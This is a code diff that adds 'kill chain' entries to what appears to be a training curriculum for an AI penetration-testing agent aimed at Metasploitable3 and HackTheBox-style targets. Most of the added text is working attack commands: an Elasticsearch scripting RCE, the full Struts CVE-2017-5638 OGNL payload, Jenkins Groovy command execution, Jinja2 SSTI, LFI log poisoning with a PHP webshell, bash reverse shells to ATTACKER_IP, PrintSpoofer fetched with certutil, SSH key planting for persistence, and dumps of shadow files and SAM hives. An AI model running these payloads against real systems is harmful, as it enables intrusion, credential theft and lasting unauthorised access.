@@ -759,6 +759,132 @@ MS3_KILL_CHAINS: List[KillChain] = [
                           "Connect back shell opened", "shell"),
         ),
     ),
+    KillChain(
+        name="ms3_elasticsearch_rce",
+        description="Elasticsearch scripting RCE → shell → credential harvest",
+        target_profile="metasploitable3",
+        difficulty="medium",
+        reasoning="Elasticsearch 1.x with dynamic scripting enabled is a common real-world vuln. "
+                  "The REST API is unauthenticated by default and allows arbitrary Java code execution "
+                  "via search queries. The agent must learn: 'any unauthenticated API with scripting = RCE.'",
+        total_expected_reward=350.0,
+        steps=(
+            KillChainStep("recon", "nmap -sV -p 9200 {target}", "Scan for Elasticsearch",
+                          "Targeted scan. Elasticsearch default port is 9200. Version detection reveals if scripting is enabled.",
+                          "9200/tcp open http Elasticsearch REST API", "Elasticsearch"),
+            KillChainStep("enumeration", "curl -s http://{target}:9200/",
+                          "Fingerprint Elasticsearch version and cluster info",
+                          "The root endpoint returns version info. Versions < 1.4.3 have dynamic scripting enabled by default.",
+                          "\"version\" : { \"number\" : \"1.1.1\" }", "version"),
+            KillChainStep("exploitation",
+                          "curl -XPOST 'http://{target}:9200/_search?pretty' -H 'Content-Type: application/json' "
+                          "-d '{\"script_fields\":{\"exec\":{\"script\":\"java.lang.Runtime.getRuntime().exec(\\\"id\\\")\"}}}'",
+                          "Execute OS command via Elasticsearch scripting engine",
+                          "MVEL/Groovy scripting in search queries allows arbitrary Java code execution. "
+                          "Runtime.exec() runs OS commands. This is native Elasticsearch functionality being abused.",
+                          "uid=0(root)", "uid="),
+            KillChainStep("post_exploitation",
+                          "curl -XPOST 'http://{target}:9200/_search?pretty' -d '{\"script_fields\":{\"exec\":{\"script\":"
+                          "\"java.lang.Runtime.getRuntime().exec(\\\"cat /etc/shadow\\\").text\"}}}'",
+                          "Dump shadow hashes via Elasticsearch RCE",
+                          "Reuse the same scripting RCE to read sensitive files. No need for a separate shell.",
+                          "root:$6$...", "root:"),
+            KillChainStep("closeout", "echo CLOSEOUT_COMPLETE", "Cleanup Elasticsearch logs",
+                          "Elasticsearch logs queries but doesn't expose them easily. Minimal cleanup needed.",
+                          "CLOSEOUT_COMPLETE", "CLOSEOUT"),
+        ),
+    ),
+    KillChain(
+        name="ms3_struts_rce",
+        description="Apache Struts CVE-2017-5638 → RCE via Content-Type header",
+        target_profile="metasploitable3",
+        difficulty="medium",
+        reasoning="Struts2 CVE-2017-5638 is one of the most impactful web vulns in history (Equifax breach). "
+                  "A crafted Content-Type header with OGNL expression gives instant RCE. The agent must learn "
+                  "that HTTP HEADERS can be attack vectors, not just URL parameters and POST bodies.",
+        total_expected_reward=400.0,
+        steps=(
+            KillChainStep("recon", "nmap -sV -p 8080 {target}", "Scan for Tomcat/Struts",
+                          "Tomcat on 8080 often hosts Struts2 applications. Version detection helps confirm.",
+                          "8080/tcp open http Apache Tomcat", "Tomcat"),
+            KillChainStep("enumeration", "curl -s -I http://{target}:8080/struts2-showcase/",
+                          "Check for Struts2 showcase application",
+                          "The Struts2 showcase app is a common deployment on test/dev servers. "
+                          "Its presence confirms Struts2 is running and likely vulnerable.",
+                          "200 OK", "200"),
+            KillChainStep("exploitation",
+                          "curl -H \"Content-Type: %{(#_='multipart/form-data')."
+                          "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
+                          "(#_memberAccess?(#_memberAccess=#dm):"
+                          "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
+                          "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
+                          "(#ognlUtil.getExcludedPackageNames().clear())."
+                          "(#ognlUtil.getExcludedClasses().clear())."
+                          "(#context.setMemberAccess(#dm))))."
+                          "(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
+                          "(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
+                          "(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true))."
+                          "(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
+                          "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\" "
+                          "http://{target}:8080/struts2-showcase/",
+                          "Exploit Struts2 CVE-2017-5638 via OGNL injection in Content-Type header",
+                          "The Content-Type header is parsed by the Jakarta Multipart parser which evaluates "
+                          "OGNL expressions. This gives arbitrary Java code execution via ProcessBuilder.",
+                          "uid=0(root)", "uid="),
+            KillChainStep("post_exploitation", "Use same Struts RCE to cat /etc/shadow",
+                          "Harvest credentials via Struts RCE",
+                          "Reuse the OGNL injection with 'cat /etc/shadow' as the command. One-shot cred dump.",
+                          "root:$6$...", "root:"),
+        ),
+    ),
+    KillChain(
+        name="ms3_full_multi_vector",
+        description="Multi-vector MS3 assault: Jenkins + MySQL + SSH persistence",
+        target_profile="metasploitable3",
+        difficulty="hard",
+        reasoning="MS3 rewards multi-vector approaches. Unlike MS2's instant backdoors, MS3 requires "
+                  "combining web app exploitation, database access, and credential reuse to achieve "
+                  "full compromise. This chain teaches the agent to build redundant access paths.",
+        total_expected_reward=500.0,
+        steps=(
+            KillChainStep("recon", "nmap -sV -sC -p 22,80,3306,8080,8484,9200 {target}",
+                          "Targeted scan of high-value MS3 services",
+                          "Focus on known MS3 service ports. Skip full scan when target profile is known.",
+                          "22/tcp ssh... 8484/tcp http Jenkins... 9200/tcp Elasticsearch", "open"),
+            KillChainStep("exploitation",
+                          "curl -d 'script=println \"id\".execute().text' http://{target}:8484/script",
+                          "Vector 1: Jenkins Groovy console → RCE",
+                          "Jenkins script console is the fastest MS3 RCE. Check this FIRST before web app attacks.",
+                          "uid=0(root)", "uid="),
+            KillChainStep("exploitation",
+                          "mysql -h {target} -u root -psploitme -e 'SELECT user,password FROM mysql.user'",
+                          "Vector 2: MySQL credential dump with known weak password",
+                          "MS3 MySQL root password is 'sploitme'. Dump all database credentials for lateral movement.",
+                          "| root | sploitme |", "root"),
+            KillChainStep("post_exploitation",
+                          "curl -d 'script=println \"cat /etc/shadow\".execute().text' http://{target}:8484/script",
+                          "Harvest credentials via Jenkins RCE",
+                          "Use Jenkins as our primary C2 channel for post-exploitation commands.",
+                          "root:$6$... vagrant:$6$...", "root:"),
+            KillChainStep("privilege_escalation",
+                          "curl -d 'script=println \"ssh-keygen -f /tmp/ms3key -N '' && "
+                          "cat /tmp/ms3key.pub >> /root/.ssh/authorized_keys\".execute().text' "
+                          "http://{target}:8484/script",
+                          "Plant SSH key for persistent root access via Jenkins",
+                          "Use Jenkins RCE to generate and plant an SSH key. This gives persistent "
+                          "encrypted access that survives Jenkins restarts.",
+                          "Generating public/private rsa key pair", "key"),
+            KillChainStep("exfiltration",
+                          "curl -d 'script=println \"cat /etc/shadow | base64\".execute().text' "
+                          "http://{target}:8484/script",
+                          "Exfiltrate shadow hashes via Jenkins",
+                          "Base64-encode sensitive data for clean extraction through HTTP.",
+                          "cm9vdDokNi...", "base64"),
+            KillChainStep("closeout", "echo CLOSEOUT_COMPLETE", "Full cleanup",
+                          "Remove planted SSH keys, clear Jenkins logs, restore MySQL state.",
+                          "CLOSEOUT_COMPLETE", "CLOSEOUT"),
+        ),
+    ),
 ]
 
 
@@ -945,6 +1071,152 @@ HTB_KILL_CHAINS: List[KillChain] = [
                           "Python with SUID can call setuid(0) to become root, then spawn a root shell. "
                           "This is a GTFOBins technique. The agent should memorize: python+SUID=root.",
                           "root@target:#", "root@"),
+        ),
+    ),
+    KillChain(
+        name="htb_ssti_to_shell",
+        description="Server-Side Template Injection → RCE → shell",
+        target_profile="generic",
+        difficulty="medium",
+        reasoning="SSTI is the #2 web exploit after SQLi on HTB. The agent MUST learn to test for "
+                  "template injection in ANY user input reflected in the page. {{7*7}}=49 confirms SSTI. "
+                  "From there, Jinja2/Twig/Freemarker all have paths to RCE.",
+        total_expected_reward=350.0,
+        steps=(
+            KillChainStep("enumeration", "curl -s 'http://{target}/page?name={{7*7}}'",
+                          "Test for SSTI by injecting math expression",
+                          "If the page reflects '49' instead of '{{7*7}}', template injection is confirmed. "
+                          "This is the universal SSTI detection technique — works on ALL template engines.",
+                          "Hello 49", "49"),
+            KillChainStep("enumeration", "curl -s 'http://{target}/page?name={{config.__class__.__init__.__globals__}}'",
+                          "Enumerate available Python objects for Jinja2 SSTI",
+                          "Jinja2 SSTI on Flask gives access to Python internals via config object. "
+                          "Navigate the MRO (Method Resolution Order) to find os.popen for RCE.",
+                          "os", "os"),
+            KillChainStep("exploitation",
+                          "curl -s 'http://{target}/page?name={{config.__class__.__init__.__globals__[\"os\"].popen(\"id\").read()}}'",
+                          "Execute OS command via Jinja2 SSTI",
+                          "Chain: config → __class__ → __init__ → __globals__ → os module → popen → RCE. "
+                          "This is the standard Jinja2 SSTI-to-RCE path. Memorize this chain.",
+                          "uid=33(www-data)", "uid="),
+            KillChainStep("exploitation",
+                          "curl -s 'http://{target}/page?name={{config.__class__.__init__.__globals__[\"os\"].popen("
+                          "\"bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'\").read()}}'",
+                          "Upgrade SSTI to reverse shell",
+                          "Use SSTI to launch a reverse shell. Bash reverse shell is the most reliable for Linux.",
+                          "Connection received", "shell"),
+            KillChainStep("privilege_escalation", "sudo -l && find / -perm -4000 2>/dev/null",
+                          "Enumerate privesc vectors from www-data shell",
+                          "www-data rarely has sudo but ALWAYS check. Then enumerate SUID binaries.",
+                          "/usr/bin/python3", "python"),
+        ),
+    ),
+    KillChain(
+        name="htb_lfi_log_poison",
+        description="Local File Inclusion → Log Poisoning → RCE → shell",
+        target_profile="generic",
+        difficulty="medium",
+        reasoning="LFI + log poisoning is one of the most elegant web attacks. The agent reads a log "
+                  "file via LFI, then injects PHP code into the log (via User-Agent header), then "
+                  "includes the poisoned log file to trigger code execution. Zero file upload needed.",
+        total_expected_reward=350.0,
+        steps=(
+            KillChainStep("enumeration", "curl -s 'http://{target}/page?file=../../../etc/passwd'",
+                          "Confirm LFI by reading /etc/passwd",
+                          "Path traversal to read /etc/passwd confirms LFI. If this works, we can read "
+                          "any file on the system — and more importantly, we can INCLUDE executable files.",
+                          "root:x:0:0:", "root:"),
+            KillChainStep("enumeration", "curl -s 'http://{target}/page?file=../../../var/log/apache2/access.log'",
+                          "Confirm we can read Apache access log via LFI",
+                          "If we can include the access log, we can poison it with PHP code. "
+                          "Apache logs User-Agent headers, which we control.",
+                          "GET /", "GET"),
+            KillChainStep("exploitation",
+                          "curl -s -A '<?php system($_GET[\"cmd\"]); ?>' 'http://{target}/'",
+                          "Poison Apache access log with PHP webshell via User-Agent",
+                          "The User-Agent header is logged verbatim to access.log. By sending PHP code "
+                          "as our User-Agent, we inject executable code into the log file.",
+                          "200 OK", "200"),
+            KillChainStep("exploitation",
+                          "curl -s 'http://{target}/page?file=../../../var/log/apache2/access.log&cmd=id'",
+                          "Trigger RCE by including the poisoned log file",
+                          "Now when LFI includes the access log, PHP parses our injected code and executes "
+                          "the 'cmd' parameter. This is a full webshell via log poisoning.",
+                          "uid=33(www-data)", "uid="),
+            KillChainStep("exploitation",
+                          "curl -s 'http://{target}/page?file=../../../var/log/apache2/access.log"
+                          "&cmd=bash+-c+\"bash+-i+>%26+/dev/tcp/ATTACKER/4444+0>%261\"'",
+                          "Upgrade log poison to reverse shell",
+                          "Use the log-poisoned webshell to launch a reverse shell for stable access.",
+                          "Connection received", "shell"),
+        ),
+    ),
+    KillChain(
+        name="htb_windows_token_privesc",
+        description="Windows: SeImpersonatePrivilege → Potato attack → SYSTEM",
+        target_profile="generic",
+        difficulty="hard",
+        reasoning="Token impersonation via Potato attacks is THE most common Windows privesc on HTB. "
+                  "If whoami /priv shows SeImpersonatePrivilege (which IIS/SQL service accounts ALWAYS have), "
+                  "it's instant SYSTEM via PrintSpoofer, JuicyPotato, or GodPotato.",
+        total_expected_reward=400.0,
+        steps=(
+            KillChainStep("privilege_escalation", "whoami /priv",
+                          "Check current user privileges on Windows",
+                          "This is THE FIRST command to run on any Windows shell. SeImpersonatePrivilege = SYSTEM. "
+                          "SeBackupPrivilege = read anything. SeRestorePrivilege = write anything.",
+                          "SeImpersonatePrivilege Enabled", "SeImpersonate"),
+            KillChainStep("privilege_escalation",
+                          "certutil -urlcache -split -f http://ATTACKER/PrintSpoofer64.exe C:\\Windows\\Temp\\ps.exe",
+                          "Transfer PrintSpoofer to target",
+                          "certutil is the standard Windows file transfer tool available on all versions. "
+                          "PrintSpoofer abuses the Print Spooler service to impersonate SYSTEM token.",
+                          "CertUtil: -URLCache command completed", "completed"),
+            KillChainStep("privilege_escalation",
+                          "C:\\Windows\\Temp\\ps.exe -i -c \"cmd /c whoami\"",
+                          "Execute PrintSpoofer for SYSTEM shell",
+                          "PrintSpoofer creates a named pipe, triggers the Print Spooler to connect to it, "
+                          "impersonates the SYSTEM token, and runs our command as NT AUTHORITY\\SYSTEM.",
+                          "nt authority\\system", "system"),
+            KillChainStep("post_exploitation",
+                          "reg save HKLM\\SAM C:\\Windows\\Temp\\sam && reg save HKLM\\SYSTEM C:\\Windows\\Temp\\sys",
+                          "Dump SAM and SYSTEM registry hives for offline hash extraction",
+                          "SAM + SYSTEM hives contain local account password hashes. Extractable with "
+                          "secretsdump.py or mimikatz. These are the Windows equivalent of /etc/shadow.",
+                          "The operation completed successfully", "completed"),
+        ),
+    ),
+    KillChain(
+        name="htb_subdomain_vhost_to_shell",
+        description="Virtual host discovery → hidden app → exploit → shell",
+        target_profile="generic",
+        difficulty="medium",
+        reasoning="Many HTB boxes hide applications behind virtual hosts. If gobuster finds nothing on "
+                  "the main domain, the agent MUST fuzz for subdomains/vhosts. This is the #1 mistake "
+                  "beginners make — giving up after dirbusting when the real app is on a subdomain.",
+        total_expected_reward=300.0,
+        steps=(
+            KillChainStep("recon", "nmap -sV -sC -p 80,443 {target}", "Scan web services",
+                          "Basic web scan. Check for hostname redirects in HTTP headers — they reveal domain names.",
+                          "80/tcp open http... Did not follow redirect to http://target.htb", "http"),
+            KillChainStep("enumeration",
+                          "ffuf -u http://{target} -H 'Host: FUZZ.target.htb' "
+                          "-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0",
+                          "Fuzz for virtual host subdomains",
+                          "Each virtual host serves different content based on the Host header. "
+                          "ffuf with Host header fuzzing discovers hidden applications. -fs 0 filters empty responses.",
+                          "dev [Status: 200, Size: 3421]", "dev"),
+            KillChainStep("enumeration",
+                          "gobuster dir -u http://dev.target.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt",
+                          "Enumerate the discovered hidden application",
+                          "The hidden vhost often has debug endpoints, admin panels, or unfinished features "
+                          "with less security. Directory brute force reveals exploitable paths.",
+                          "/admin /api /debug /upload", "/"),
+            KillChainStep("exploitation", "Exploit the discovered application vulnerability",
+                          "Attack the hidden application",
+                          "Hidden dev/staging apps often have: debug mode enabled, default creds, "
+                          "file upload without filters, or exposed API keys. Exploit the specific vuln found.",
+                          "uid=33(www-data)", "uid="),
         ),
     ),
 ]
